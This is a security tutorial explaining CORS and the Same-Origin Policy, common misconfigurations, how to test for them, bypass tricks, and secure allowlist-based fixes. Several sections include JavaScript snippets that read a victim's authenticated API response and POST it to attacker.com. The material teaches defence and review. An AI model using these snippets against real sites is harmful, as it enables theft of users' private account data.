CORS (Cross-Origin Resource Sharing)
Cross-Origin Resource Sharing (CORS) is a browser security mechanism that controls how resources from one domain can be accessed by another domain. It exists to extend the browser’s Same-Origin Policy (SOP) in a controlled way. 
When CORS is misconfigured, attackers may be able to read sensitive responses from another domain through the victim's browser. 


1. Same-Origin Policy (SOP)
Before understanding CORS, it is important to understand the Same-Origin Policy.
The Same-Origin Policy is a browser security control that prevents scripts on one origin from accessing data on another origin.

Origin = Scheme + Host + Port
Example:

https://example.com
Breakdown:

Scheme : https
Host   : example.com
Port   : 443
If any of these differ, the origin is considered different.
Example:

https://example.com
https://api.example.com
https://example.com:8080
http://example.com
All of these are treated as different origins.


Why Same-Origin Policy Exists
Without SOP, any website could freely access data from any other website loaded in the same browser session.
Example attack scenario:

User logged into: https://bank.com
         │
         ▼
User visits: https://evil.com
         │
         ▼
evil.com JavaScript sends request to:

https://bank.com/accountDetails
         │
         ▼
Without SOP → attacker reads response
Result:

Account Balance
Transaction History
Personal Data
SOP blocks this behavior by default.


2. Why CORS Exists
Modern web applications often need cross-domain communication.
Example architecture:

Frontend: https://app.company.com
Backend : https://api.company.com
Without CORS:

Browser blocks request
CORS allows the server to explicitly declare:

Which domains can access the resource
Which methods are allowed
Whether credentials can be sent
Example header:

Access-Control-Allow-Origin: https://app.company.com
This tells the browser:

Allow cross-origin requests from this domain


3. How CORS Works
The browser sends an Origin header in cross-origin requests.
Example request:

GET /api/profile HTTP/1.1
Host: api.company.com
Origin: https://app.company.com
Server response:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.company.com
Browser checks:

Does the allowed origin match the request origin?
If yes → browser allows the response to be read.
If no → browser blocks access.


CORS Flow

Client Browser
      │
      │  Request
      │  Origin: https://app.company.com
      ▼
API Server
      │
      │  Response
      │  Access-Control-Allow-Origin: https://app.company.com
      ▼
Browser validates policy
      │
      ▼
Allow response to JavaScript


4. Important CORS Headers
Access-Control-Allow-Origin
Specifies which origin can access the resource.
Example:

Access-Control-Allow-Origin: https://app.company.com
Dangerous configuration:

Access-Control-Allow-Origin: *
This allows any website to request the resource.


Access-Control-Allow-Credentials
Allows cookies or authentication tokens to be sent.
Example:

Access-Control-Allow-Credentials: true
This means the browser will include:

Cookies
Authorization headers
TLS client certificates
If misconfigured, attackers may access authenticated user data. 


Access-Control-Allow-Methods
Defines allowed HTTP methods.
Example:

Access-Control-Allow-Methods: GET, POST, PUT


Access-Control-Allow-Headers
Defines which request headers are allowed.
Example:

Access-Control-Allow-Headers: Authorization, Content-Type


5. Preflight Requests
For sensitive requests, the browser performs a preflight check.
This is an HTTP OPTIONS request.
Example:

OPTIONS /api/updateProfile
Preflight request:

OPTIONS /api/updateProfile HTTP/1.1
Origin: https://app.company.com
Access-Control-Request-Method: PUT
Server response:

Access-Control-Allow-Origin: https://app.company.com
Access-Control-Allow-Methods: PUT
Access-Control-Allow-Headers: Authorization
If allowed, the browser sends the actual request.


Preflight Flow

Browser
   │
   │ OPTIONS request
   ▼
Server
   │
   │ allowed methods / headers
   ▼
Browser
   │
   │ actual request
   ▼
Server response


6. CORS Misconfiguration
CORS vulnerabilities occur when servers incorrectly trust arbitrary origins.
This may allow attackers to read sensitive API responses from another domain. 
Example vulnerable configuration:

Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Or dynamic origin reflection:

Access-Control-Allow-Origin: <user-controlled-origin>
These configurations break the protection provided by the Same-Origin Policy. 


High Level Attack Idea

Victim logged into: target.com
         │
         ▼
Victim visits: evil.com
         │
         ▼
evil.com sends cross-origin request
         │
         ▼
CORS misconfigured server allows response
         │
         ▼
Attacker steals sensitive data


Example Attack Script

<script>

fetch("https://target.com/api/user-data", {
  credentials: "include"
})
.then(res => res.json())
.then(data => {

  fetch("https://attacker.com/steal", {
      method: "POST",
      body: JSON.stringify(data)
  });

});

</script>
The browser sends the request using the victim’s cookies and returns the data to the attacker's page if CORS allows it. 

7. Common CORS Misconfiguration Patterns

Most CORS vulnerabilities occur because developers try to make cross-origin communication “work quickly” without carefully restricting origins.

Below are the most common patterns security engineers encounter during security reviews and penetration tests.

7.1 Wildcard Origin (*)

One of the most common misconfigurations.

Server configuration:

Access-Control-Allow-Origin: *

This means:

Any website can send cross-origin requests to this API

Example scenario:

https://api.target.com/user/profile

Server response:

Access-Control-Allow-Origin: *

If the endpoint contains public information, this may be acceptable.

However, if the endpoint returns sensitive user data, this becomes dangerous.

Example sensitive response:

User email
User address
Internal account data
Why this becomes dangerous

When combined with authentication cookies, attackers may try to steal authenticated responses.

But modern browsers block this if:

Access-Control-Allow-Credentials = true
AND
Access-Control-Allow-Origin = *

This combination is not allowed by browsers.

However developers often attempt workarounds which create worse vulnerabilities.

7.2 Origin Reflection (Dynamic Origin)

This is one of the most dangerous CORS misconfigurations.

Server reflects the incoming origin dynamically.

Example request:

GET /api/account

Origin: https://evil.com

Server response:

Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

This means the server trusts any origin provided by the browser.

Attack Flow
Victim logs into target.com
        │
        ▼
Victim visits evil.com
        │
        ▼
evil.com sends request to target API
        │
        ▼
Browser includes victim cookies
        │
        ▼
Server reflects evil.com as allowed origin
        │
        ▼
Attacker reads sensitive API response
Example Attack Script
<script>

fetch("https://target.com/api/userinfo", {
  credentials: "include"
})
.then(res => res.text())
.then(data => {

  fetch("https://attacker.com/steal", {
     method: "POST",
     body: data
  });

});

</script>

If the server dynamically reflects the origin, the attacker will receive the authenticated response.

7.3 Allowing null Origin

Some applications allow the origin:

Access-Control-Allow-Origin: null

This is extremely dangerous because null origin can come from several contexts.

Examples:

sandboxed iframes
data URLs
file:// URLs
local files

Attack scenario:

Attacker hosts malicious HTML file
Victim downloads and opens it locally
Local file executes JavaScript
Origin becomes: null
Server allows null origin
Sensitive response leaked
Attack Example
Origin: null

Server response:

Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

Result:

Attacker can read authenticated API responses
7.4 Trusted Subdomain Abuse

Sometimes developers allow a trusted subdomain.

Example configuration:

Access-Control-Allow-Origin: https://*.example.com

Or dynamically allow:

anything.example.com

This looks safe but becomes dangerous if:

Any subdomain can be taken over

Example:

dev.example.com
blog.example.com
test.example.com
old.example.com

If any of these are vulnerable to subdomain takeover, attackers can host malicious scripts from a trusted origin.

Attack Flow
Attacker takes over subdomain
       │
       ▼
Hosts malicious JavaScript
       │
       ▼
Browser sends request to API
Origin = trusted subdomain
       │
       ▼
Server allows request
       │
       ▼
Attacker reads sensitive data
7.5 Regex or Partial Matching Errors

Another common mistake is improper origin validation.

Example server code:

if(origin.contains("example.com")){
    allow();
}

Attacker origin:

https://example.com.evil.com

Server logic:

origin contains "example.com"

Result:

Access granted to attacker domain
ASCII Example
Expected Origin

https://example.com
        │
        ▼
Allowed


Attacker Origin

https://example.com.evil.com
        │
        ▼
Still allowed (due to weak validation)
8. Internal Network CORS Abuse

CORS misconfiguration can also expose internal services.

Example scenario:

Internal API
http://intranet.company.local

Accessible only within corporate network.

But CORS allows:

Access-Control-Allow-Origin: *

Attack scenario:

Employee opens attacker website
         │
         ▼
Attacker JavaScript sends request
to internal API
         │
         ▼
Browser can access internal network
         │
         ▼
Sensitive data leaked to attacker

This is sometimes called:

Browser-based SSRF
9. Real-World Impact of CORS Vulnerabilities

When exploited, CORS vulnerabilities may lead to:

Account information leakage
Personal data exposure
API token theft
Internal API data access
Cloud metadata exposure
Financial data leakage

Example sensitive endpoints attackers target:

/api/profile
/api/account
/api/billing
/api/transactions
/api/settings
10. Why CORS Vulnerabilities Are Hard to Notice

Unlike many vulnerabilities, CORS issues are tricky because:

Server still behaves normally
Application still works
Only the browser enforces the policy

Meaning:

Server logs may show normal requests
But attacker JavaScript reads the response

This makes detection harder.

11. How to Detect CORS Misconfiguration
CORS vulnerabilities are usually discovered during:

Security Reviews
Manual Penetration Testing
Bug Bounty Testing
Architecture Reviews
Unlike many vulnerabilities, CORS issues are often not visible directly in the application UI. They must be tested by inspecting HTTP request and response headers.


11.1 Manual Testing Approach
The simplest way to test CORS is by modifying the Origin header.
Normal request:

GET /api/user/profile HTTP/1.1
Host: target.com
Origin: https://target.com
Server response:

Access-Control-Allow-Origin: https://target.com
Now change the origin.

Origin: https://evil.com
If the response becomes:

Access-Control-Allow-Origin: https://evil.com
then the server is reflecting the origin dynamically, which may indicate a vulnerability.


11.2 Testing Using Burp Suite
Tools like Burp Suite make CORS testing easier.
Testing steps:

1. Capture a request to an API endpoint
2. Send the request to Burp Repeater
3. Modify the Origin header
4. Observe the server response headers
Example modified request:

GET /api/account HTTP/1.1
Host: target.com
Origin: https://attacker.com
Response:

Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
This combination indicates a serious CORS vulnerability.


11.3 Automated Detection
Security tools may detect CORS issues automatically.
Common tools include:

Burp Suite Scanner
OWASP ZAP
Nuclei templates
Custom security scanners
However, automated scanners often produce false positives, so manual validation is necessary.


12. Exploiting CORS Vulnerabilities
If the server allows attacker-controlled origins and credentials, attackers can build malicious JavaScript pages.
Example attack page:

attacker.com
Malicious JavaScript:

<script>

fetch("https://target.com/api/userinfo", {
   credentials: "include"
})
.then(response => response.text())
.then(data => {

   fetch("https://attacker.com/log", {
       method: "POST",
       body: data
   });

});

</script>
Attack result:

Victim visits attacker.com
Browser sends request to target.com
Victim cookies included
Server allows attacker origin
Response returned to attacker's script
Sensitive data exfiltrated


13. Common CORS Bypass Techniques
Even when developers try to restrict origins, attackers may still find bypass techniques.


13.1 Subdomain Bypass
Allowed origin:

https://*.example.com
Attacker registers or takes over:

evil.example.com
Now the attacker hosts malicious scripts on that subdomain.


13.2 Origin Parsing Errors
Some servers perform incorrect validation.
Example server logic:

if(origin.endsWith("example.com"))
Attacker origin:

evil-example.com
or

example.com.attacker.com
Server incorrectly allows the request.


13.3 Protocol Confusion
Some servers check only domain names but ignore protocol differences.
Allowed origin:

https://example.com
Attacker origin:

http://example.com
If validation ignores protocol, attacker-controlled HTTP endpoints may be allowed.


13.4 Localhost Trust
Developers sometimes allow localhost for development purposes.

Access-Control-Allow-Origin: http://localhost
Attackers can exploit this if the victim runs local applications that interact with sensitive APIs.


14. Secure CORS Architecture
CORS must be implemented carefully during API design and architecture review.
Security engineers should ensure the following principles.


14.1 Explicit Allowlist
Only allow trusted domains.
Example:

Access-Control-Allow-Origin: https://app.example.com
Never allow dynamic reflection.


14.2 Avoid Wildcard with Credentials
The following combination is dangerous:

Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Sensitive APIs should never allow unrestricted origins.


14.3 Restrict Sensitive APIs
Endpoints containing sensitive information should avoid CORS entirely if possible.
Example:

/api/account
/api/payment
/api/user/settings
These APIs should only be accessible from the same origin.


14.4 Validate Origin Properly
Secure validation example:

allowedOrigins = [
   "https://app.example.com",
   "https://portal.example.com"
]

if(origin in allowedOrigins){
   allow()
}
Avoid:

string matching
regex shortcuts
substring checks


15. Secure Coding Example
Insecure Implementation

const origin = req.headers.origin

res.setHeader("Access-Control-Allow-Origin", origin)
res.setHeader("Access-Control-Allow-Credentials", "true")
Problem:

Any origin becomes trusted


Secure Implementation

const allowedOrigins = [
   "https://app.example.com"
]

const origin = req.headers.origin

if(allowedOrigins.includes(origin)){
   res.setHeader("Access-Control-Allow-Origin", origin)
   res.setHeader("Access-Control-Allow-Credentials", "true")
}
This ensures only explicitly trusted domains are allowed.


16. Security Engineer Review Checklist
When reviewing APIs for CORS issues, security engineers should verify:

1. Is CORS needed for this endpoint?
2. Are origins explicitly allowlisted?
3. Is origin reflection prevented?
4. Are credentials restricted?
5. Are sensitive endpoints exposed via CORS?
6. Are subdomains securely controlled?
7. Is origin validation implemented correctly?


Security Engineer Mental Model
When reviewing CORS configurations, experienced security engineers ask three simple questions:

1. Who can send cross-origin requests?
2. Can authenticated responses be read?
3. Can attackers control the allowed origin?
If the answer to all three becomes yes, the system is vulnerable.


